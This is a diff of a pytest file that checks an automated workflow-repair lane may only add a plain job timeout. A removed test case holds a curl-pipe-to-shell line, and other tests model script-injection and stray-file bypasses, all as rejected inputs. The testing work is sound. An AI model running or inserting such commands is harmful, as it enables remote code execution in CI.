@@ -7,14 +7,19 @@ rule, and nothing in policy can widen the exception.
 
 from __future__ import annotations
 
+import difflib
 import json
+import shutil
+from datetime import datetime, timezone
 from pathlib import Path
 
 import pytest
 import yaml
 
-from gaia_cli.steward.models import AuthorityClass, DispatchPacket, RoutingBudget
+from gaia_cli.steward.controller import StewardController
+from gaia_cli.steward.models import AuthorityClass, DispatchPacket, Observation, RoutingBudget, Subject
 from gaia_cli.steward.policy import POLICY_RELATIVE_PATH, PolicyError, StewardPolicy
+from gaia_cli.steward.routing import RoutingError, render_dispatch
 from gaia_cli.steward.sensors_ci import CiWorkflowSensor
 from gaia_cli.steward.verification import (
     PROOF_TRANSCRIPT_SCHEMA,
@@ -22,6 +27,7 @@ from gaia_cli.steward.verification import (
     parse_proof_transcript,
     parse_unified_diff,
 )
+from gaia_cli.steward.workflowproof import apply_patch
 from tests.steward.sensor_fixtures import make_repo
 
 
@@ -29,6 +35,7 @@ REPO_ROOT = Path(__file__).resolve().parents[2]
 RULE = "workflow-timeout-repair"
 NOW = "2026-11-07T00:00:00Z"
 LOCK_SUFFIX = ".lock.yml"
+FROZEN = datetime(2026, 11, 7, tzinfo=timezone.utc)
 
 
 def _policy_copy(tmp_path: Path, mutate) -> Path:
@@ -162,18 +169,7 @@ def test_policy_requires_every_workflow_route_exclusion(tmp_path: Path, dropped:
         StewardPolicy.load(_policy_copy(tmp_path, mutate))
 
 
-def test_the_exception_cannot_be_reached_by_renaming_the_rule(tmp_path: Path) -> None:
-    """The exception is keyed on the debt kind; a second rule for it is refused."""
-
-    def mutate(data) -> None:
-        rules = data["routing"]["dispatchRules"]
-        rules["another-workflow-rule"] = dict(rules[RULE])
-
-    with pytest.raises(PolicyError, match="multiple dispatch rules"):
-        StewardPolicy.load(_policy_copy(tmp_path, mutate))
-
-
-# --- mechanical verification ------------------------------------------------
+# --- shared verification helpers ---------------------------------------------------------
 
 
 def _packet() -> DispatchPacket:
@@ -206,7 +202,7 @@ def _transcript(packet: DispatchPacket):
     )
 
 
-def _verdict(diff: str, packet: DispatchPacket | None = None):
+def _verdict(diff: str, packet: DispatchPacket | None = None, *, baseline: dict[str, str | None] | None = None):
     packet = packet or _packet()
     return evaluate(
         packet=packet,
@@ -217,27 +213,347 @@ def _verdict(diff: str, packet: DispatchPacket | None = None):
         baseline_open_debt=[],
         current_open_debt=[],
         authority_still_class_b=True,
+        workflow_baseline=baseline,
     )
 
 
-def _diff(path: str, *lines: str, old: tuple[str, ...] = ("    runs-on: ubuntu-latest",)) -> str:
-    context = "".join(f" {line}\n" for line in old)
-    added = "".join(f"+{line}\n" for line in lines)
-    return (
-        f"diff --git a/{path} b/{path}\n"
-        "index 1111111..2222222 100644\n"
-        f"--- a/{path}\n"
-        f"+++ b/{path}\n"
-        f"@@ -1,{len(old)} +1,{len(old) + len(lines)} @@\n"
-        f"{context}{added}"
+CI = ".github/workflows/ci.yml"
+
+
+# --- policy binding: rule id and debt kind are paired ---------------------------
+
+
+def test_renaming_the_original_workflow_rule_is_refused(tmp_path: Path) -> None:
+    """Moving the shipped rule under another id must not carry the .github exception with it."""
+
+    def mutate(data) -> None:
+        rules = data["routing"]["dispatchRules"]
+        rules["arbitrary-workflow-rule"] = rules.pop(RULE)
+
+    with pytest.raises(PolicyError, match="belongs to rule workflow-timeout-repair and debt kind workflow_hygiene"):
+        StewardPolicy.load(_policy_copy(tmp_path, mutate))
+
+
+def test_a_second_workflow_hygiene_rule_is_refused(tmp_path: Path) -> None:
+    def mutate(data) -> None:
+        rules = data["routing"]["dispatchRules"]
+        rules["another-workflow-rule"] = dict(rules[RULE])
+
+    with pytest.raises(PolicyError, match="multiple dispatch rules|belongs to rule"):
+        StewardPolicy.load(_policy_copy(tmp_path, mutate))
+
+
+def test_the_workflow_rule_id_cannot_be_pointed_at_another_debt_kind(tmp_path: Path) -> None:
+    def mutate(data) -> None:
+        rules = data["routing"]["dispatchRules"]
+        rules[RULE] = dict(rules["registry-integrity-review"])  # same id, a different debt kind
+        del rules["registry-integrity-review"]
+
+    with pytest.raises(PolicyError, match="belongs to rule"):
+        StewardPolicy.load(_policy_copy(tmp_path, mutate))
+
+
+# --- dispatch eligibility: only pure missing-timeout debts get the packet ------------
+
+
+class _WorkflowSensor:
+    id = "ci-workflow"
+
+    def __init__(self, subject: str, findings: list[dict[str, str]], **state: object) -> None:
+        self.subject, self.findings, self.state = subject, findings, state
+
+    def scan(self, root: Path, observed_at: str) -> list[Observation]:
+        return [
+            Observation(
+                kind="workflow_hygiene",
+                subject=Subject("workflow", self.subject),
+                observed_at=observed_at,
+                source=self.id,
+                status="drift",
+                current_state={"findingCount": 0},
+                observed_state={
+                    "findingCount": len(self.findings),
+                    "findings": self.findings,
+                    "findingsCapped": False,
+                    **self.state,
+                },
+            )
+        ]
+
+
+def _dispatch(tmp_path: Path, subject: str, findings: list[dict[str, str]], **state: object):
+    root = tmp_path / "repo"
+    destination = root / POLICY_RELATIVE_PATH
+    destination.parent.mkdir(parents=True)
+    shutil.copyfile(REPO_ROOT / POLICY_RELATIVE_PATH, destination)
+    sensor = _WorkflowSensor(subject, findings, **state)
+    controller = StewardController(sensors=[sensor], clock=lambda: FROZEN)
+    debt_id = sensor.scan(root, NOW)[0].debt_id
+    return render_dispatch(root, debt_id, controller=controller)
+
+
+MISSING = {"rule": "missing-timeout", "detail": "job build has no timeout-minutes"}
+OTHER = {"rule": "write-all-permissions", "detail": "$.permissions grants write-all"}
+
+
+def test_a_pure_missing_timeout_debt_gets_the_workflow_packet(tmp_path: Path) -> None:
+    result = _dispatch(tmp_path, CI, [MISSING])
+    assert isinstance(result.artifact, DispatchPacket)
+    assert result.artifact.rule == RULE
+    assert result.artifact.allowed_paths == (".github/workflows/*.yml",)
+
+
+@pytest.mark.parametrize(
+    ("subject", "findings", "state", "why"),
+    [
+        (CI, [OTHER], {}, "other than missing-timeout"),
+        (CI, [MISSING, OTHER], {}, "other than missing-timeout"),
+        (CI, [{"rule": "unparseable-workflow", "detail": "x"}], {}, "other than missing-timeout"),
+        (CI, [MISSING], {"findingsCapped": True}, "empty or capped"),
+        (CI, [], {}, "empty or capped"),
+        (CI, [MISSING], {"laneEligible": False, "laneIneligibleReason": "gh-aw generated"}, "gh-aw generated"),
+        (".github/workflows/steward-build-pi.lock.yml", [MISSING], {}, "direct-child hand-written"),
+        (".github/workflows/ci.yaml", [MISSING], {}, "direct-child hand-written"),
+        (".github/workflows/shared/x.yml", [MISSING], {}, "direct-child hand-written"),
+    ],
+)
+def test_explicit_dispatch_refuses_a_debt_the_route_may_not_repair(
+    tmp_path: Path, subject: str, findings: list[dict[str, str]], state: dict[str, object], why: str
+) -> None:
+    with pytest.raises(RoutingError, match=why):
+        _dispatch(tmp_path, subject, findings, **state)
+
+
+# --- structural proof ------------------------------------------------------------------
+
+BEFORE = """\
+name: ci
+on:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: |
+          echo safe
+  lint:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - run: echo lint
+"""
+
+
+def _timed(text: str, job: str = "build", value: str = "15") -> str:
+    """Add a job-level timeout directly under ``runs-on`` of the named job."""
+
+    marker = f"  {job}:\n    runs-on: ubuntu-latest\n"
+    assert marker in text
+    return text.replace(marker, marker + f"    timeout-minutes: {value}\n", 1)
+
+
+def _patch(path: str, before: str | None, after: str) -> str:
+    old = [] if before is None else before.splitlines(keepends=True)
+    return "".join(
+        difflib.unified_diff(
+            old,
+            after.splitlines(keepends=True),
+            fromfile="/dev/null" if before is None else f"a/{path}",
+            tofile=f"b/{path}",
+            n=3,
+        )
     )
 
 
-def test_adding_a_timeout_line_to_a_workflow_passes_the_mechanical_gate() -> None:
-    verdict = _verdict(_diff(".github/workflows/ci.yml", "    timeout-minutes: 15"))
-    assert verdict.scope_valid
+def _structural(before: str, after: str, path: str = CI):
+    return _verdict(_patch(path, before, after), baseline={path: before})
+
+
+def test_a_proper_job_timeout_passes_the_structural_proof() -> None:
+    verdict = _structural(BEFORE, _timed(BEFORE))
+    assert verdict.scope_valid, verdict.reasons
     assert verdict.verdict == "pending"  # the machine never accepts
-    assert verdict.change_set.workflow_edit_violations == ()
+
+
+def test_two_missing_timeouts_in_one_file_pass_together() -> None:
+    before = BEFORE.replace("    timeout-minutes: 360\n", "")
+    after = _timed(_timed(before, "build", "15"), "lint", "10")
+    assert _structural(before, after).scope_valid
+
+
+def _step_level(text: str) -> str:
+    return text.replace("      - uses: actions/checkout@v4\n", "      - uses: actions/checkout@v4\n        timeout-minutes: 15\n", 1)
+
+
+def _script_injection(text: str) -> str:
+    # The reviewer's concrete bypass: a real job timeout plus a line inside a run: | scalar.
+    return _timed(text).replace("          echo safe\n", "          echo safe\n          timeout-minutes: 15\n", 1)
+
+
+def _duplicate_override(text: str) -> str:
+    return text.replace("    timeout-minutes: 360\n", "    timeout-minutes: 360\n    timeout-minutes: 1\n", 1)
+
+
+def _changed_value(text: str) -> str:
+    return text.replace("timeout-minutes: 360", "timeout-minutes: 60", 1)
+
+
+@pytest.mark.parametrize(
+    ("label", "mutate"),
+    [
+        ("step-level key", lambda t: _step_level(_timed(t))),
+        ("script injection inside a run scalar", _script_injection),
+        ("duplicate key overriding an existing timeout", _duplicate_override),
+        ("rewriting an existing timeout", _changed_value),
+        ("unicode numerals", lambda t: _timed(t, value="١٥")),
+        ("fullwidth numerals", lambda t: _timed(t, value="１５")),
+        ("hex integer", lambda t: _timed(t, value="0x0F")),
+        ("octal-looking integer", lambda t: _timed(t, value="015")),
+        ("underscore integer", lambda t: _timed(t, value="1_5")),
+        ("sexagesimal integer", lambda t: _timed(t, value="1:30")),
+        ("quoted string", lambda t: _timed(t, value="'15'")),
+        ("float", lambda t: _timed(t, value="15.0")),
+        ("boolean", lambda t: _timed(t, value="true")),
+        ("zero", lambda t: _timed(t, value="0")),
+        ("above the platform ceiling", lambda t: _timed(t, value="361")),
+        ("explicit tag", lambda t: _timed(t, value="!!int 15")),
+        ("alias value", lambda t: _timed(t, value="*limit")),
+        ("a second change beside the timeout", lambda t: _timed(t).replace("contents: read", "contents: write", 1)),
+        ("a new step beside the timeout", lambda t: _timed(t) + "      - run: echo extra\n"),
+        ("a new job", lambda t: _timed(t) + "  extra:\n    runs-on: ubuntu-latest\n    timeout-minutes: 5\n    steps:\n      - run: echo x\n"),
+    ],
+)
+def test_the_structural_proof_rejects_anything_but_a_plain_job_timeout(label: str, mutate) -> None:
+    verdict = _structural(BEFORE, mutate(BEFORE))
+    assert not verdict.scope_valid, label
+    assert verdict.verdict == "reject", label
+
+
+def test_aliases_and_anchors_in_the_baseline_are_rejected() -> None:
+    anchored = BEFORE.replace("  build:\n    runs-on: ubuntu-latest\n", "  build:\n    runs-on: &runner ubuntu-latest\n", 1)
+    assert "&runner" in anchored
+    verdict = _structural(anchored, anchored.replace("    runs-on: &runner ubuntu-latest\n", "    runs-on: &runner ubuntu-latest\n    timeout-minutes: 15\n", 1))
+    assert not verdict.scope_valid
+    assert any("anchors" in item for item in verdict.reasons)
+
+
+def test_an_added_key_inside_an_anchored_mapping_is_rejected() -> None:
+    before = BEFORE.replace(
+        "jobs:\n",
+        "x-env: &env\n  A: '1'\njobs:\n",
+        1,
+    ).replace("      - run: echo lint\n", "      - run: echo lint\n        env: *env\n", 1)
+    after = before.replace("  A: '1'\n", "  A: '1'\n  timeout-minutes: 15\n", 1)
+    verdict = _structural(before, after)
+    assert not verdict.scope_valid
+    assert any("aliases" in item or "anchors" in item for item in verdict.reasons)
+
+
+def test_multi_document_baseline_is_rejected() -> None:
+    before = BEFORE + "---\nname: second\njobs:\n  z:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo z\n"
+    verdict = _structural(before, _timed(before))
+    assert not verdict.scope_valid
+    assert any("exactly one YAML document" in item for item in verdict.reasons)
+
+
+def test_a_duplicate_key_baseline_is_rejected() -> None:
+    before = BEFORE.replace("permissions:\n  contents: read\n", "permissions:\n  contents: read\npermissions:\n  contents: write\n", 1)
+    verdict = _structural(before, _timed(before))
+    assert not verdict.scope_valid
+    assert any("duplicate mapping key" in item for item in verdict.reasons)
+
+
+def test_a_reusable_workflow_call_job_cannot_take_a_timeout() -> None:
+    before = BEFORE + "  call:\n    uses: ./.github/workflows/other.yml\n"
+    after = before.replace("    uses: ./.github/workflows/other.yml\n", "    uses: ./.github/workflows/other.yml\n    timeout-minutes: 15\n", 1)
+    verdict = _structural(before, after)
+    assert not verdict.scope_valid
+    assert any("reusable-workflow" in item for item in verdict.reasons)
+
+
+def test_without_a_baseline_a_workflow_edit_is_unprovable_and_rejected() -> None:
+    verdict = _verdict(_patch(CI, BEFORE, _timed(BEFORE)), baseline=None)
+    assert not verdict.scope_valid
+    assert any("no baseline content" in item for item in verdict.reasons)
+
+
+def test_a_diff_that_does_not_apply_to_the_baseline_is_rejected() -> None:
+    verdict = _verdict(_patch(CI, BEFORE, _timed(BEFORE)), baseline={CI: BEFORE.replace("ubuntu-latest", "macos-latest")})
+    assert not verdict.scope_valid
+    assert any("does not apply" in item for item in verdict.reasons)
+
+
+def test_a_no_op_workflow_diff_proves_nothing_and_is_rejected() -> None:
+    verdict = _structural(BEFORE, BEFORE.replace("name: ci", "name: ci2", 1))
+    assert not verdict.scope_valid
+
+
+def test_no_newline_at_end_of_file_is_applied_exactly() -> None:
+    before = "jobs:\n  a:\n    runs-on: x"
+    after = "jobs:\n  a:\n    runs-on: x\n    timeout-minutes: 5"
+    diff = (
+        f"diff --git a/{CI} b/{CI}\n--- a/{CI}\n+++ b/{CI}\n"
+        "@@ -1,3 +1,4 @@\n jobs:\n   a:\n-    runs-on: x\n\\ No newline at end of file\n"
+        "+    runs-on: x\n+    timeout-minutes: 5\n\\ No newline at end of file\n"
+    )
+    changes = parse_unified_diff(diff)
+    assert apply_patch(before, changes.workflow_patches[0][1]) == after
+    verdict = _verdict(diff, baseline={CI: before})
+    assert verdict.scope_valid, verdict.reasons
+
+
+# --- creation, deletion, header-only sections ---------------------------------------------
+
+
+def test_creating_a_workflow_is_rejected_even_when_it_is_only_a_timeout_line() -> None:
+    new_file = (
+        f"diff --git a/{CI} b/{CI}\nnew file mode 100644\nindex 0000000..2222222\n"
+        f"--- /dev/null\n+++ b/{CI}\n@@ -0,0 +1 @@\n+    timeout-minutes: 15\n"
+    )
+    verdict = _verdict(new_file, baseline={CI: None})
+    assert not verdict.scope_valid
+    assert verdict.change_set.changes[0].created_file
+    assert any("creation is never allowed" in item for item in verdict.change_set.workflow_edit_violations)
+
+
+def test_creating_a_workflow_without_the_new_file_mode_line_is_still_creation() -> None:
+    new_file = f"--- /dev/null\n+++ b/{CI}\n@@ -0,0 +1 @@\n+    timeout-minutes: 15\n"
+    verdict = _verdict(new_file, baseline={CI: None})
+    assert not verdict.scope_valid
+    assert verdict.change_set.changes[0].created_file
+
+
+def test_an_empty_new_workflow_with_no_hunks_is_still_seen_and_rejected() -> None:
+    """git applies a header-only section; it has no ---/+++ pair, so it used to be invisible."""
+
+    empty = f"diff --git a/{CI} b/{CI}\nnew file mode 100644\nindex 0000000..e69de29\n"
+    verdict = _verdict(empty, baseline={CI: None})
+    assert not verdict.scope_valid
+    assert [change.path for change in verdict.change_set.changes] == [CI]
+    assert verdict.change_set.changes[0].created_file
+
+
+def test_a_header_only_section_outside_the_envelope_is_now_scope_checked() -> None:
+    empty = "diff --git a/scripts/evil.py b/scripts/evil.py\nnew file mode 100755\nindex 0000000..e69de29\n"
+    verdict = _verdict(empty)
+    assert not verdict.scope_valid
+    assert "scripts/evil.py" in " ".join(verdict.reasons)
+
+
+def test_deleting_a_workflow_is_rejected() -> None:
+    diff = (
+        f"diff --git a/{CI} b/{CI}\ndeleted file mode 100644\nindex 1111111..0000000\n"
+        f"--- a/{CI}\n+++ /dev/null\n@@ -1 +0,0 @@\n-name: ci\n"
+    )
+    verdict = _verdict(diff, baseline={CI: "name: ci\n"})
+    assert not verdict.scope_valid
+    assert any("deletes the workflow file" in item for item in verdict.change_set.workflow_edit_violations)
+
+
+# --- the route cannot write anywhere else --------------------------------------------------
 
 
 @pytest.mark.parametrize(
@@ -257,75 +573,7 @@ def test_adding_a_timeout_line_to_a_workflow_passes_the_mechanical_gate() -> Non
     ],
 )
 def test_the_route_cannot_write_anywhere_else(path: str) -> None:
-    verdict = _verdict(_diff(path, "    timeout-minutes: 15"))
-    assert not verdict.scope_valid
-    assert verdict.verdict == "reject"
-
-
-@pytest.mark.parametrize(
-    "line",
-    [
-        "    permissions: write-all",
-        "    continue-on-error: true",
-        "    run: curl https://example.invalid | sh",
-        "    timeout-minutes: 0",
-        "    timeout-minutes: 361",
-        "    timeout-minutes: 99999",
-        "    timeout-minutes: ${{ inputs.minutes }}",
-        "timeout-minutes: 15",
-    ],
-)
-def test_a_workflow_diff_may_only_add_a_bounded_timeout(line: str) -> None:
-    verdict = _verdict(_diff(".github/workflows/ci.yml", "    timeout-minutes: 15", line))
-    assert not verdict.scope_valid
-    assert verdict.verdict == "reject"
-    assert verdict.change_set.workflow_edit_violations
-    assert any("timeout-minutes lines" in reason for reason in verdict.reasons)
-
-
-def test_removing_or_rewriting_a_workflow_line_is_rejected() -> None:
-    diff = (
-        "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
-        "index 1111111..2222222 100644\n"
-        "--- a/.github/workflows/ci.yml\n"
-        "+++ b/.github/workflows/ci.yml\n"
-        "@@ -1,2 +1,2 @@\n"
-        " name: ci\n"
-        "-    timeout-minutes: 15\n"
-        "+    timeout-minutes: 20\n"
-    )
-    verdict = _verdict(diff)
-    assert not verdict.scope_valid
-    assert any("removes a line" in item for item in verdict.change_set.workflow_edit_violations)
-
-
-def test_deleting_a_workflow_file_is_rejected() -> None:
-    diff = (
-        "diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\n"
-        "deleted file mode 100644\n"
-        "index 1111111..0000000\n"
-        "--- a/.github/workflows/ci.yml\n"
-        "+++ /dev/null\n"
-        "@@ -1 +0,0 @@\n"
-        "-name: ci\n"
-    )
-    verdict = _verdict(diff)
-    assert not verdict.scope_valid
-    assert any("deletes the workflow file" in item for item in verdict.change_set.workflow_edit_violations)
-
-
-def test_creating_a_workflow_file_is_rejected() -> None:
-    diff = (
-        "diff --git a/.github/workflows/new.yml b/.github/workflows/new.yml\n"
-        "new file mode 100644\n"
-        "index 0000000..2222222\n"
-        "--- /dev/null\n"
-        "+++ b/.github/workflows/new.yml\n"
-        "@@ -0,0 +1,2 @@\n"
-        "+name: sneaky\n"
-        "+on: push\n"
-    )
-    verdict = _verdict(diff)
+    verdict = _verdict(_patch(path, "a: 1\n", "a: 1\nb: 2\n"), baseline={path: "a: 1\n"})
     assert not verdict.scope_valid
     assert verdict.verdict == "reject"
 
@@ -359,19 +607,19 @@ def _other_rule_packet(rule_id: str) -> DispatchPacket:
 )
 def test_every_other_rules_packet_rejects_a_workflow_write(rule_id: str) -> None:
     packet = _other_rule_packet(rule_id)
-    for path in (".github/workflows/ci.yml", ".github/workflows/steward-build-pi.lock.yml"):
-        verdict = _verdict(_diff(path, "    timeout-minutes: 15"), packet)
+    for path in (CI, ".github/workflows/steward-build-pi.lock.yml"):
+        verdict = _verdict(_patch(path, BEFORE, _timed(BEFORE)), packet, baseline={path: BEFORE})
         assert not verdict.scope_valid, (rule_id, path)
         assert verdict.verdict == "reject", (rule_id, path)
 
 
-# --- the sensor keeps generated lock files out of the lane --------------------
+# --- the sensor keeps non-routable debt out of the lane ---------------------------------------
 
 
 WORKFLOW_NO_TIMEOUT = "name: ci\non: push\npermissions:\n  contents: read\njobs:\n  build:\n    runs-on: ubuntu-latest\n"
 
 
-def test_lock_files_stay_visible_but_never_take_a_lane_slot(tmp_path: Path) -> None:
+def test_non_routable_workflow_debt_stays_visible_but_never_takes_a_lane_slot(tmp_path: Path) -> None:
     root = make_repo(
         tmp_path / "repo",
         {
@@ -379,23 +627,23 @@ def test_lock_files_stay_visible_but_never_take_a_lane_slot(tmp_path: Path) -> N
             f".github/workflows/steward-build-pi{LOCK_SUFFIX}": WORKFLOW_NO_TIMEOUT,
             ".github/workflows/compiled.yml": "# This file was automatically generated by gh-aw. DO NOT EDIT.\n"
             + WORKFLOW_NO_TIMEOUT,
+            ".github/workflows/legacy.yaml": WORKFLOW_NO_TIMEOUT,
+            ".github/workflows/mixed.yml": WORKFLOW_NO_TIMEOUT.replace("contents: read", "write-all").replace(
+                "permissions:\n  write-all", "permissions: write-all"
+            ),
         },
     )
     by_id = {o.subject.id: o for o in CiWorkflowSensor().scan(root, NOW)}
-    assert set(by_id) == {
-        ".github/workflows/ci.yml",
+    assert "laneEligible" not in by_id[".github/workflows/ci.yml"].observed_state
+    for ineligible in (
         f".github/workflows/steward-build-pi{LOCK_SUFFIX}",
         ".github/workflows/compiled.yml",
-    }
-    assert "laneEligible" not in by_id[".github/workflows/ci.yml"].observed_state
-    for generated in (f".github/workflows/steward-build-pi{LOCK_SUFFIX}", ".github/workflows/compiled.yml"):
-        state = by_id[generated].observed_state
-        assert state["laneEligible"] is False
-        assert "gh-aw" in state["laneIneligibleReason"]
-        assert state["findingCount"] == 1
-
-
-# --- documentation of record --------------------------------------------------
+        ".github/workflows/legacy.yaml",
+        ".github/workflows/mixed.yml",
+    ):
+        state = by_id[ineligible].observed_state
+        assert state["laneEligible"] is False, ineligible
+        assert state["laneIneligibleReason"], ineligible
 
 
 def test_the_routine_guide_says_findings_are_configuration_not_runtime_timeouts() -> None:
@@ -404,3 +652,15 @@ def test_the_routine_guide_says_findings_are_configuration_not_runtime_timeouts(
     assert "does **not** say the job ever hung" in guide
     assert "never merges its own change" in guide
     assert ".lock.yml" in guide
+
+
+def test_unavailable_run_history_is_an_unconditional_stop() -> None:
+    """No semantics-only fallback anywhere in the policy envelope or the guide."""
+
+    rule = _live_rule()
+    joined = " ".join(rule.stop_conditions).lower()
+    assert "history cannot be read" in joined
+    assert "do not bound" not in joined and "semantics do not" not in joined
+    guide = (REPO_ROOT / rule.prompt_guide).read_text(encoding="utf-8")
+    assert "there is no semantics-only fallback" in guide
+    assert "does not bound" not in guide
